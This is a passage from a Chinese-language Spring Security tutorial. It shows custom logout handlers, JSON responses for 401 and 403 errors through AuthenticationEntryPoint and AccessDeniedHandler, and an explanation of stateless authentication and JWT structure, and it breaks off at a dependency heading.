<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span> <span class="comment">// 注册为 Spring Bean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyLogoutSuccessHandler</span> <span class="keyword">implements</span> <span class="title class_">LogoutSuccessHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onLogoutSuccess</span><span class="params">(HttpServletRequest request, </span></span><br><span class="line"><span class="params">                                HttpServletResponse response, </span></span><br><span class="line"><span class="params">                                Authentication authentication)</span> </span><br><span class="line">                                <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        </span><br><span class="line">        response.setStatus(HttpStatus.OK.value());</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonResponse</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;code\&quot;: 200, \&quot;message\&quot;: \&quot;Logout successful\&quot;&#125;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        response.getWriter().write(jsonResponse);</span><br><span class="line">        response.getWriter().flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码解读</strong>:</p>
<ul>
<li><code>onLogoutSuccess</code> 方法会在注销流程成功执行后被调用。</li>
<li><code>authentication</code> 参数包含了注销前用户的认证信息，你可以在这里获取用户名等信息进行日志记录。</li>
<li>我们设置了响应的状态码为 200 OK，<code>Content-Type</code> 为 <code>application/json</code>。</li>
<li>然后向响应体中写入自定义的 JSON 字符串。</li>
<li><strong>注意</strong>: 在自定义 Handler 中，我们完全控制了响应。Spring Security 不会再执行任何默认的重定向操作。</li>
</ul>
<p><strong>步骤 2: 在安全配置中使用自定义的 Handler</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MyLogoutSuccessHandler myLogoutSuccessHandler;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        .logout(logout -&gt; logout</span><br><span class="line">            .logoutUrl(<span class="string">&quot;/api/logout&quot;</span>)</span><br><span class="line">            <span class="comment">// 使用 .logoutSuccessHandler() 替代 .logoutSuccessUrl()</span></span><br><span class="line">            .logoutSuccessHandler(myLogoutSuccessHandler) </span><br><span class="line">        );</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 <code>.logoutSuccessHandler()</code> 方法，我们将自定义的处理器注入到了注销配置中。现在，当用户访问 <code>/api/logout</code> 时，成功注销后将收到我们定义的 JSON 响应，而不是页面跳转。</p>
<h4 id="4-4-4-添加自定义的注销处理器-LogoutHandler"><a href="#4-4-4-添加自定义的注销处理器-LogoutHandler" class="headerlink" title="4.4.4 添加自定义的注销处理器 (LogoutHandler)"></a>4.4.4 添加自定义的注销处理器 (<code>LogoutHandler</code>)</h4><p><code>LogoutSuccessHandler</code> 是在<strong>注销成功后</strong>执行的。如果你需要在<strong>注销过程中</strong>执行一些自定义的清理逻辑（例如，记录用户登出日志、调用第三方服务使 Token 失效等），你应该实现 <code>LogoutHandler</code> 接口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyLogoutHandler</span> <span class="keyword">implements</span> <span class="title class_">LogoutHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Authentication authentication)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (authentication != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> authentication.getName();</span><br><span class="line">            <span class="comment">// 在这里执行自定义逻辑，比如记录日志</span></span><br><span class="line">            System.out.println(<span class="string">&quot;User &quot;</span> + username + <span class="string">&quot; is logging out.&quot;</span>);</span><br><span class="line">            <span class="comment">// 或者调用服务使 JWT Token 黑名单</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>在配置中使用</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MyLogoutHandler myLogoutHandler;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">.logout(logout -&gt; logout</span><br><span class="line">    .addLogoutHandler(myLogoutHandler) <span class="comment">// 添加自定义 LogoutHandler</span></span><br><span class="line">    .logoutSuccessUrl(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>你可以通过 <code>.addLogoutHandler()</code> 添加多个 <code>LogoutHandler</code>。它们会与 Spring Security 内置的处理器（如 <code>CookieClearingLogoutHandler</code>, <code>SecurityContextLogoutHandler</code>）一起被依次调用。</p>
<hr>
<h3 id="4-5-异常处理"><a href="#4-5-异常处理" class="headerlink" title="4.5 异常处理"></a>4.5 异常处理</h3><p>在 Spring Security 的过滤器链中，当一个安全相关的异常被抛出时，<code>ExceptionTranslationFilter</code> 会捕获它，并根据异常的类型，将处理工作委托给两个核心的策略接口：<code>AuthenticationEntryPoint</code> 和 <code>AccessDeniedHandler</code>。</p>
<p>理解这两者的区别是掌握 Spring Security 异常处理的关键。</p>
<h4 id="4-5-1-AuthenticationEntryPoint-未认证用户的“入口点”"><a href="#4-5-1-AuthenticationEntryPoint-未认证用户的“入口点”" class="headerlink" title="4.5.1 AuthenticationEntryPoint: 未认证用户的“入口点”"></a>4.5.1 <code>AuthenticationEntryPoint</code>: 未认证用户的“入口点”</h4><ul>
<li><p><strong>是什么？</strong><br><code>AuthenticationEntryPoint</code> 是一个接口，它定义了当一个**未认证（匿名）<strong>的用户尝试访问一个需要认证的受保护资源时，应该如何</strong>“开始”**认证流程。它的名字“入口点”非常形象，它就是引导匿名用户进入认证流程的起点。</p>
</li>
<li><p><strong>何时触发？</strong><br>当 <code>ExceptionTranslationFilter</code> 捕获到一个 <code>AuthenticationException</code> 时，就会调用 <code>AuthenticationEntryPoint</code>。这通常发生在：</p>
<ol>
<li>一个匿名用户直接访问了一个受保护的 URL（例如 <code>http://.../dashboard</code>）。</li>
<li>用户提交了无效的凭证（如错误的密码），导致认证失败，抛出了 <code>BadCredentialsException</code>（它是 <code>AuthenticationException</code> 的子类）。</li>
</ol>
</li>
<li><p><strong>默认行为</strong><br>Spring Security 根据你的配置，提供了不同的默认实现：</p>
<ul>
<li>如果配置了 <strong>Form Login</strong> (<code>.formLogin()</code>)，默认的 <code>LoginUrlAuthenticationEntryPoint</code> 会将用户<strong>重定向到登录页面</strong>。</li>
<li>如果配置了 <strong>HTTP Basic</strong> (<code>.httpBasic()</code>)，默认的 <code>BasicAuthenticationEntryPoint</code> 会向浏览器返回一个 <strong><code>401 Unauthorized</code></strong> 状态码，并带上 <code>WWW-Authenticate</code> 头，触发浏览器的原生登录对话框。</li>
</ul>
</li>
<li><p><strong>自定义实现（REST API 场景）</strong><br>在前后端分离的 REST API 中，我们不希望重定向到 HTML 页面，而是希望返回一个结构化的 JSON 响应，并附带 <code>401</code> 状态码。</p>
<p><strong>步骤 1: 创建 <code>AuthenticationEntryPoint</code> 的实现类</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAuthenticationEntryPoint</span> <span class="keyword">implements</span> <span class="title class_">AuthenticationEntryPoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">commence</span><span class="params">(HttpServletRequest request, </span></span><br><span class="line"><span class="params">                         HttpServletResponse response, </span></span><br><span class="line"><span class="params">                         AuthenticationException authException)</span> </span><br><span class="line">                         <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        </span><br><span class="line">        response.setStatus(HttpStatus.UNAUTHORIZED.value()); <span class="comment">// 设置状态码 401</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 返回一个提示需要登录的 JSON</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonResponse</span> <span class="operator">=</span> String.format(</span><br><span class="line">            <span class="string">&quot;&#123;\&quot;code\&quot;: %d, \&quot;message\&quot;: \&quot;Sorry, you must be authenticated to access this resource.\&quot;, \&quot;error\&quot;: \&quot;%s\&quot;&#125;&quot;</span>,</span><br><span class="line">            HttpStatus.UNAUTHORIZED.value(),</span><br><span class="line">            authException.getMessage()</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        response.getWriter().write(jsonResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 2: 在安全配置中应用</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MyAuthenticationEntryPoint myAuthenticationEntryPoint;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        <span class="comment">// ... 其他配置</span></span><br><span class="line">        .exceptionHandling(exceptions -&gt; exceptions</span><br><span class="line">            .authenticationEntryPoint(myAuthenticationEntryPoint)</span><br><span class="line">        );</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="4-5-2-AccessDeniedHandler-已认证但无权限用户的“处理器”"><a href="#4-5-2-AccessDeniedHandler-已认证但无权限用户的“处理器”" class="headerlink" title="4.5.2 AccessDeniedHandler: 已认证但无权限用户的“处理器”"></a>4.5.2 <code>AccessDeniedHandler</code>: 已认证但无权限用户的“处理器”</h4><ul>
<li><p><strong>是什么？</strong><br><code>AccessDeniedHandler</code> 是一个接口，它定义了当一个<strong>已经认证</strong>的用户尝试访问一个他<strong>没有足够权限</strong>的资源时，应该如何处理。</p>
</li>
<li><p><strong>何时触发？</strong><br>当 <code>ExceptionTranslationFilter</code> 捕获到一个 <code>AccessDeniedException</code> 时，就会调用 <code>AccessDeniedHandler</code>。这个异常通常由授权决策者（如 <code>AuthorizationManager</code> 或 <code>AccessDecisionManager</code>）在检查权限（例如 <code>hasRole(&#39;ADMIN&#39;)</code>）失败后抛出。</p>
</li>
<li><p><strong>默认行为</strong><br>默认的 <code>AccessDeniedHandlerImpl</code> 会向浏览器返回一个 <strong><code>403 Forbidden</code></strong> 的错误页面。这通常是一个非常简陋的、由 Web 服务器提供的页面。</p>
</li>
<li><p><strong>自定义实现（REST API 场景）</strong><br>同样，在 REST API 中，我们希望返回一个 <code>403</code> 状态码和 JSON 错误信息，而不是一个 HTML 页面。</p>
<p><strong>步骤 1: 创建 <code>AccessDeniedHandler</code> 的实现类</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAccessDeniedHandler</span> <span class="keyword">implements</span> <span class="title class_">AccessDeniedHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpServletRequest request, </span></span><br><span class="line"><span class="params">                       HttpServletResponse response, </span></span><br><span class="line"><span class="params">                       AccessDeniedException accessDeniedException)</span> </span><br><span class="line">                       <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                       </span><br><span class="line">        response.setStatus(HttpStatus.FORBIDDEN.value()); <span class="comment">// 设置状态码 403</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonResponse</span> <span class="operator">=</span> String.format(</span><br><span class="line">            <span class="string">&quot;&#123;\&quot;code\&quot;: %d, \&quot;message\&quot;: \&quot;Access Denied. You do not have the required permissions.\&quot;, \&quot;error\&quot;: \&quot;%s\&quot;&#125;&quot;</span>,</span><br><span class="line">            HttpStatus.FORBIDDEN.value(),</span><br><span class="line">            accessDeniedException.getMessage()</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        response.getWriter().write(jsonResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 2: 在安全配置中应用</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MyAccessDeniedHandler myAccessDeniedHandler;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        <span class="comment">// ... 其他配置</span></span><br><span class="line">        .exceptionHandling(exceptions -&gt; exceptions</span><br><span class="line">            <span class="comment">// .authenticationEntryPoint(...) // 可以同时配置</span></span><br><span class="line">            .accessDeniedHandler(myAccessDeniedHandler)</span><br><span class="line">        );</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="4-5-3-总结与对比"><a href="#4-5-3-总结与对比" class="headerlink" title="4.5.3 总结与对比"></a>4.5.3 总结与对比</h4><p>将这两个组件放在一起配置，就可以完全控制你的 API 的安全异常响应：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MyAuthenticationEntryPoint myAuthenticationEntryPoint;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> MyAccessDeniedHandler myAccessDeniedHandler;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        <span class="comment">// ... authorizeHttpRequests, csrf, cors 等配置</span></span><br><span class="line">        .exceptionHandling(exceptions -&gt; exceptions</span><br><span class="line">            .authenticationEntryPoint(myAuthenticationEntryPoint) <span class="comment">// 处理未认证</span></span><br><span class="line">            .accessDeniedHandler(myAccessDeniedHandler)           <span class="comment">// 处理未授权</span></span><br><span class="line">        );</span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>决策流程图</strong>:</p>
<pre><code class="highlight mermaid">flowchart TD
    A[请求进入&lt;br&gt;ExceptionTranslationFilter] --&gt; B&#123;安全异常被抛出?&#125;
    B --&gt;|是| C&#123;是 AuthenticationException?&lt;br&gt;用户未登录&#125;
    B --&gt;|否| G[继续处理请求]
    C --&gt;|是| D[调用 AuthenticationEntryPoint]
    C --&gt;|否| E&#123;是 AccessDeniedException?&lt;br&gt;用户已登录但无权限&#125;
    D --&gt; F[通常返回 401 + JSON&lt;br&gt;或重定向到 /login]
    E --&gt;|是| H[调用 AccessDeniedHandler]
    H --&gt; I[通常返回 403 + JSON]</code></pre>

<table>
<thead>
<tr>
<th>特性</th>
<th><code>AuthenticationEntryPoint</code></th>
<th><code>AccessDeniedHandler</code></th>
</tr>
</thead>
<tbody><tr>
<td><strong>处理的用户状态</strong></td>
<td><strong>未认证 (Anonymous)</strong></td>
<td><strong>已认证 (Authenticated)</strong></td>
</tr>
<tr>
<td><strong>触发的异常</strong></td>
<td><code>AuthenticationException</code> 及其子类</td>
<td><code>AccessDeniedException</code></td>
</tr>
<tr>
<td><strong>核心问题</strong></td>
<td><strong>“你是谁？”</strong> - 用户身份未知或无效。</td>
<td><strong>“你能做什么？”</strong> - 用户身份已知，但权限不足。</td>
</tr>
<tr>
<td><strong>典型 HTTP 状态码</strong></td>
<td><strong>401 Unauthorized</strong> (需要认证)</td>
<td><strong>403 Forbidden</strong> (禁止访问)</td>
</tr>
<tr>
<td><strong>典型行为 (Web)</strong></td>
<td>重定向到登录页</td>
<td>显示“禁止访问”错误页</td>
</tr>
<tr>
<td><strong>典型行为 (API)</strong></td>
<td>返回 JSON，提示客户端需要登录并提供凭证。</td>
<td>返回 JSON，提示客户端当前用户没有权限执行该操作。</td>
</tr>
</tbody></table>
<hr>
<h2 id="5-现代化应用集成：JWT-与-OAuth2"><a href="#5-现代化应用集成：JWT-与-OAuth2" class="headerlink" title="5. 现代化应用集成：JWT 与 OAuth2"></a>5. 现代化应用集成：JWT 与 OAuth2</h2><h3 id="5-1-无状态认证与-JWT-JSON-Web-Token"><a href="#5-1-无状态认证与-JWT-JSON-Web-Token" class="headerlink" title="5.1 无状态认证与 JWT (JSON Web Token)"></a>5.1 无状态认证与 JWT (JSON Web Token)</h3><p>传统的基于 Session 的认证机制在服务器端存储用户的会札信息，这被称为<strong>有状态 (Stateful)</strong> 认证。然而，随着分布式系统、微服务和前后端分离架构的兴起，有状态认证的弊端日益凸显，<strong>无状态 (Stateless)</strong> 认证应运而生，而 JWT 则是实现无状态认证最主流的技术方案。</p>
<h4 id="5-1-1-为什么需要无状态认证？"><a href="#5-1-1-为什么需要无状态认证？" class="headerlink" title="5.1.1 为什么需要无状态认证？"></a>5.1.1 为什么需要无状态认证？</h4><ol>
<li><strong>可伸缩性 (Scalability) 问题</strong>:<ul>
<li><strong>有状态</strong>: 用户的 Session 信息存储在某一台服务器的内存中。如果系统需要水平扩展（增加更多服务器实例），请求可能会被负载均衡器分发到没有该用户 Session 的服务器上，导致认证失败。解决方案（如 Session 复制或集中式 Session 存储）会增加系统的复杂性和开销。</li>
<li><strong>无状态</strong>: 服务器不存储任何会话信息。每个请求都包含了所有必要的认证信息（如 JWT）。任何一台服务器收到请求后，都可以独立地对其进行验证，从而实现无缝的水平扩展。</li>
</ul>
</li>
<li><strong>微服务架构的挑战</strong>:<ul>
<li>在一个复杂的微服务系统中，一个来自客户端的请求可能需要经过多个微服务（如 API 网关 -&gt; 订单服务 -&gt; 库存服务）。如果使用 Session，就需要建立一套复杂的机制来在所有服务间共享 Session 状态，这几乎是不可行的。</li>
<li>使用无状态的 Token，API 网关在验证 Token 后，可以将解析出的用户信息传递给下游服务，或者下游服务自己也可以独立验证 Token，服务之间解耦，架构更清晰。</li>
</ul>
</li>
<li><strong>多客户端支持 (SPA, 移动应用)</strong>:<ul>
<li>传统的 Session 机制严重依赖于浏览器的 Cookie (<code>JSESSIONID</code>)。</li>
<li>对于单页面应用 (SPA)、移动 App (iOS&#x2F;Android)、桌面应用等非浏览器客户端，处理 Cookie 并非它们的标准或最佳实践。</li>
<li>使用 Token（通常放在 <code>Authorization</code> 请求头中）是一种跨平台的、标准化的 API 认证方式，所有类型的客户端都能轻松支持。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="5-1-2-JWT-结构详解：Header-Payload-Signature"><a href="#5-1-2-JWT-结构详解：Header-Payload-Signature" class="headerlink" title="5.1.2 JWT 结构详解：Header, Payload, Signature"></a>5.1.2 JWT 结构详解：Header, Payload, Signature</h4><p>JWT 本质上是一个紧凑的、自包含的、URL 安全的字符串，它由三部分组成，每部分都经过 Base64Url 编码，并用点 (<code>.</code>) 连接。</p>
<p><code>xxxxx.yyyyy.zzzzz</code><br>(Header).(Payload).(Signature)</p>
<p><strong>把 JWT 想象成一张带防伪标识的身份证：</strong></p>
<ul>
<li><strong>Header (头部)</strong>: 身份证的“元信息”，说明了这张卡的类型和防伪技术。</li>
<li><strong>Payload (载荷)</strong>: 身份证的“个人信息”，包含了姓名、性别、出生日期等。</li>
<li><strong>Signature (签名)</strong>: 身份证的“防伪镭射标”，用来验证这张卡是不是伪造的。</li>
</ul>
<h5 id="1-Header-头部"><a href="#1-Header-头部" class="headerlink" title="1. Header (头部)"></a>1. Header (头部)</h5><p>描述 JWT 的元数据，通常包含两部分：</p>
<ul>
<li><code>typ</code> (Type): 令牌的类型，固定为 “JWT”。</li>
<li><code>alg</code> (Algorithm): 用于生成签名的算法，如 <code>HS256</code> (HMAC using SHA-256) 或 <code>RS256</code> (RSA using SHA-256)。</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这部分 JSON 会被 Base64Url 编码，形成 JWT 的第一部分。</p>
<hr>
<h5 id="2-Payload-载荷"><a href="#2-Payload-载荷" class="headerlink" title="2. Payload (载荷)"></a>2. Payload (载荷)</h5><p>存放实际需要传递的数据，这些数据被称为“声明 (Claims)”。声明分为三类：</p>
<ul>
<li><strong>Registered Claims (注册声明)</strong>: 官方预定义的一组声明，建议使用但非强制。<ul>
<li><code>iss</code> (Issuer): 签发者</li>
<li><code>sub</code> (Subject): 主题，通常是用户的唯一标识（如用户ID或用户名）</li>
<li><code>aud</code> (Audience): 接收方</li>
<li><code>exp</code> (Expiration Time): <strong>过期时间</strong> (时间戳)，是保证 Token 安全的关键。</li>
<li><code>nbf</code> (Not Before): 生效时间 (时间戳)</li>
<li><code>iat</code> (Issued At): 签发时间 (时间戳)</li>
</ul>
</li>
<li><strong>Public Claims (公共声明)</strong>: 由使用者自行定义，但为了避免冲突，应在 <a target="_blank" rel="noopener" href="https://www.iana.org/assignments/json-web-token/json-web-token.xhtml">IANA JSON Web Token Claims</a> 注册表中注册。</li>
<li><strong>Private Claims (私有声明)</strong>: 服务端和客户端共同约定的声明，用于传递自定义信息。这是我们最常使用的部分。<ul>
<li>例如，我们可以放入用户角色、权限列表、用户ID等。</li>
</ul>
</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user123&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;roles&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ROLE_USER&quot;</span><span class="punctuation">,</span> <span class="string">&quot;ROLE_VIEWER&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1678886400</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1678890000</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>安全警告</strong>: Payload 部分只是被 Base64Url 编码，<strong>它不是加密的</strong>！任何人都可以解码并读取其中的内容。<strong>绝对不要在 Payload 中存放任何敏感信息，如密码！</strong></p>
<hr>
<h5 id="3-Signature-签名"><a href="#3-Signature-签名" class="headerlink" title="3. Signature (签名)"></a>3. Signature (签名)</h5><p>签名的作用是<strong>验证 Token 的完整性</strong>，确保它在传输过程中没有被篡改。</p>
<p>生成过程如下：</p>
<p><code>HMACSHA256(Base64UrlEncode(header) + &quot;.&quot; + Base64UrlEncode(payload), secret)</code></p>
<ul>
<li>将编码后的 Header 和 Payload 用点 (<code>.</code>) 连接起来。</li>
<li>使用 Header 中指定的签名算法 (<code>alg</code>) 和一个保存在<strong>服务器端的、绝不外泄的密钥 (secret)</strong> 对其进行加密。</li>
</ul>
<p><strong>验证过程</strong>:</p>
<p>当服务器收到一个 JWT 时，它会用相同的算法和密钥，对接收到的 Header 和 Payload 重新计算一次签名。然后，将计算出的新签名与 JWT 中附带的原始签名进行比对。</p>
<ul>
<li>如果一致，说明 Token 未被篡改且是由该服务器签发的。</li>
<li>如果不一致，说明 Token 是伪造的或已被篡改，验证失败。</li>
</ul>
<hr>
<h4 id="5-1-3-在-Spring-Security-中集成-JWT"><a href="#5-1-3-在-Spring-Security-中集成-JWT" class="headerlink" title="5.1.3 在 Spring Security 中集成 JWT"></a>5.1.3 在 Spring Security 中集成 JWT</h4><p>集成 JWT 的核心思想是：</p>
<ol>
<li><strong>禁用</strong> Spring Security 默认的 Session 管理和 CSRF 防护。</li>
<li>创建一个<strong>自定义的过滤器</strong>，在 Spring Security 的标准认证过滤器之前运行。</li>
<li>这个过滤器负责从请求中提取 JWT，验证它，如果验证通过，就构建一个 <code>Authentication</code> 对象并放入 <code>SecurityContextHolder</code>。</li>
</ol>
<p><strong>依赖引入 (以 <code>jjwt</code> 为例)</strong>:</p>
